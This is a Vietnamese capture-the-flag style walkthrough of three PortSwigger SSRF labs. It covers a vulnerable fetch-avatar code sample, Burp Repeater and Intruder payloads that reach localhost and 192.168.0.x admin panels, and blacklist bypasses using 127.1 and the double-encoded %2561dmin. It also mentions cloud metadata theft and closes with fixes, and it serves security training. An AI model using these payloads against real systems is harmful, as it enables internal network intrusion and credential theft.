# Hướng Dẫn Thực Hành 04: Đánh Sập Mạng Nội Bộ Với SSRF (Server-Side Request Forgery)

> **Mục tiêu**: Hiểu rõ bản chất lỗ hổng SSRF, biến máy chủ Backend thành "con rối" để tấn công vào mạng nội bộ (`localhost`, `192.168.x.x`), bẻ khóa bộ lọc Blacklist và làm chủ tính năng Fuzzing của **Burp Intruder**.

---

## 💡 Tổng Quan: Tại Sao SSRF Lại Là "Cơn Ác Mộng" Của Backend & Cloud?

Trong kiến trúc Backend hiện đại, máy chủ thường xuyên phải gửi request ra ngoài:
- Tải ảnh đại diện từ link URL người dùng nhập.
- Gửi Webhook sang hệ thống đối tác.
- Gọi API của các Microservices nội bộ.

### Lỗi chí mạng của Dev:
Dev nhận một URL từ Client và dùng các thư viện như `fetch()`, `axios`, `curl`, `HttpClient` để gửi request đến URL đó mà **không kiểm tra đích đến**:
```javascript
// Mã độc hại điển hình:
app.post('/api/fetch-avatar', async (req, res) => {
    const imageUrl = req.body.url;
    const response = await axios.get(imageUrl); // SSRF nằm ở đây!
    res.send(response.data);
});
```

### Kẻ tấn công làm được gì?
1. **Ép Backend tự gọi chính nó (`http://127.0.0.1/admin`)**: Vượt qua lớp tường lửa bên ngoài vì request xuất phát từ chính máy chủ (`localhost`).
2. **Quét mạng nội bộ LAN (`http://192.168.0.X:8080`)**: Khám phá các DB, Redis, ElasticSearch không đặt mật khẩu nằm sâu trong mạng riêng.
3. **Đánh cắp IAM Role của Cloud (`http://169.254.169.254`)**: Đọc AWS/GCP Metadata để lấy trọn vẹn Access Key quản trị Cloud!

---

## 🟢 LAB 1: Basic SSRF against the local server (Tấn công Localhost)
* **Link lab**: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
* **Mức độ**: Apprentice
* **Mục tiêu**: Lợi dụng tính năng "Check stock" để truy cập vào trang Admin cục bộ (`/admin`) và xóa người dùng `carlos`.

### 🔍 Góc nhìn Phân tích:
- **Lỗi của Dev**: Khi người dùng bấm kiểm tra tồn kho sản phẩm, web gửi request `POST /product/stock` kèm body:
  `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?...`
  Backend nhận param `stockApi` này và dùng HTTP client gọi thẳng đến URL đó rồi trả kết quả về.
- **Tư duy Breaker**: Thay thế toàn bộ URL `stockApi` thành URL của server nội bộ: `http://localhost/admin`.

### 🛠️ Các bước giải quyết:
1. Mở bài lab, bấm vào xem một sản phẩm bất kỳ.
2. Kéo xuống dưới, bấm nút **Check stock**.
3. Mở Burp Suite ➔ **Proxy > HTTP history**, tìm request:
   ```http
   POST /product/stock HTTP/1.1
   ...
   stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
   ```
4. Bấm `Ctrl + R` để gửi sang **Repeater**.
5. Trong Repeater, sửa giá trị tham số `stockApi` thành:
   ```text
   stockApi=http://localhost/admin
   ```
6. Bấm **Send** ➔ Response trả về giao diện Admin Panel chứa nút xóa user `carlos` với link `/admin/delete?username=carlos`.
7. Tiếp tục sửa `stockApi` thành:
   ```text
   stockApi=http://localhost/admin/delete?username=carlos
   ```
8. Bấm **Send** ➔ Carlos bị xóa ➔ **Solved!**

---

## 🟢 LAB 2: Basic SSRF against another back-end system (Quét dải mạng nội bộ bằng Burp Intruder)
* **Link lab**: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
* **Mức độ**: Apprentice
* **Mục tiêu**: Một server quản trị nằm ở dải mạng riêng `192.168.0.X:8080`. Dùng Burp Intruder để quét tìm địa chỉ IP chính xác, sau đó xóa `carlos`.

### 🔍 Góc nhìn Phân tích:
- **Tư duy Breaker**: Ta không thể truy cập trực tiếp vào dải IP `192.168.0.X` từ máy tính ở nhà. Nhưng máy chủ web của PortSwigger lại nằm chung mạng LAN với server nội bộ đó! Ta sẽ mượn tay web server để quét từ `192.168.0.1` đến `192.168.0.254`.

### 🛠️ Các bước giải quyết:
1. Bấm vào xem sản phẩm ➔ Bấm **Check stock**.
2. Tìm request `POST /product/stock` trong HTTP History, bấm chuột phải chọn **Send to Intruder** (hoặc `Ctrl + I`).
3. Chuyển sang tab **Intruder**:
   - Ở phần Request body, sửa thành:
     `stockApi=http://192.168.0.§1§:8080/admin`
     *(Ký hiệu `§` dùng để đánh dấu vị trí Burp sẽ tự động thay số)*.
4. Chuyển sang tab con **Payloads**:
   - **Payload type**: Chọn **Numbers**.
   - **From**: `1`
   - **To**: `255`
   - **Step**: `1`
5. Bấm nút màu cam góc trên bên phải: **Start attack**.
6. Một cửa sổ kết quả hiện ra:
   - Hầu hết các IP sẽ trả về mã `500 Internal Server Error` (do không có máy chủ nào ở IP đó).
   - Hãy bấm vào tiêu đề cột **Status** để sắp xếp. Bạn sẽ thấy duy nhất một IP trả về mã **`200 OK`** (ví dụ: `192.168.0.142`)!
7. Gửi request đó sang **Repeater** (`Ctrl + R`), sửa URL thành:
   ```text
   stockApi=http://192.168.0.<IP_TÌM_ĐƯỢC>:8080/admin/delete?username=carlos
   ```
8. Bấm **Send** ➔ **Solved!**

---

## 🟢 LAB 3: SSRF with blacklist-based input filter (Vượt bộ lọc Blacklist)
* **Link lab**: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
* **Mức độ**: Practitioner
* **Mục tiêu**: Backend đã cài bộ lọc chặn từ khóa `127.0.0.1` và `admin`. Vượt qua bộ lọc để truy cập `/admin` và xóa `carlos`.

### 🔍 Góc nhìn Phân tích:
- **Lỗi của Dev**: Dev dùng Blacklist sơ sài:
  ```javascript
  if (url.includes("127.0.0.1") || url.includes("localhost") || url.includes("admin")) {
      return res.status(403).send("Blocked by security filter");
  }
  ```
- **Tư duy Breaker**: Có hàng chục cách biểu diễn khác nhau của `127.0.0.1` và chuỗi `admin`:
  - `127.0.0.1` có thể viết thành: `127.1`, `0177.0.0.1` (octal), `2130706433` (decimal), hoặc `[::]` (IPv6).
  - Chuỗi `admin` có thể bypass bằng: **URL double-encoding** (`%2561dmin`), đổi hoa thường (`Admin`), hoặc chèn ký tự đặc biệt.

### 🛠️ Các bước giải quyết:
1. Bắt request `POST /product/stock`, gửi sang **Repeater**.
2. Thử đổi `stockApi=http://127.0.0.1/admin` ➔ Bị chặn: `External stock check host must not be admin or local`.
3. **Bypass IP**: Đổi `127.0.0.1` thành `127.1` (hoặc `http://127.1/`).
   Thử gửi: `stockApi=http://127.1/` ➔ Server trả về `200 OK`! Như vậy ta đã vượt qua được bộ lọc IP.
4. **Bypass từ khóa `admin`**:
   - Nếu gửi `http://127.1/admin` ➔ Vẫn bị chặn vì chứa chữ `admin`.
   - Ta mã hóa URL chữ `a` thành `%61` ➔ `%61dmin`. Nếu backend giải mã 2 lần (Double Decode), ta mã hóa thêm lần nữa: dấu `%` biến thành `%25` ➔ **`%2561dmin`**.
5. Nhập vào body request:
   ```text
   stockApi=http://127.1/%2561dmin
   ```
6. Bấm **Send** ➔ Bạn đã truy cập thành công vào Admin panel!
7. Sửa tiếp đường dẫn để xóa `carlos`:
   ```text
   stockApi=http://127.1/%2561dmin/delete?username=carlos
   ```
8. Bấm **Send** ➔ **Solved!**

#### 🛡️ Cách vá chuẩn ở Backend:
1. **Tuyệt đối không dùng Blacklist**. Hãy dùng **Whitelist** các domain/IP bên ngoài được phép gọi.
2. Kiểm tra IP sau khi DNS Resolve: Phân giải tên miền ra IP trước, nếu IP thuộc dải Private (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`) thì hủy request ngay lập tức.
3. Vô hiệu hóa HTTP Redirects trên thư viện HTTP client để tránh bị redirect vào mạng nội bộ.

---

## Checklist Hoàn Thành Của Bạn
- [x] Giải quyết xong Lab 1: Basic SSRF against local server (`http://localhost`).
- [x] Giải quyết xong Lab 2: Basic SSRF against backend system (Quét dải mạng nội bộ bằng Burp Intruder).
- [x] Giải quyết xong Lab 3: SSRF with blacklist-based input filter (Bypass `127.1` & Double URL encode).
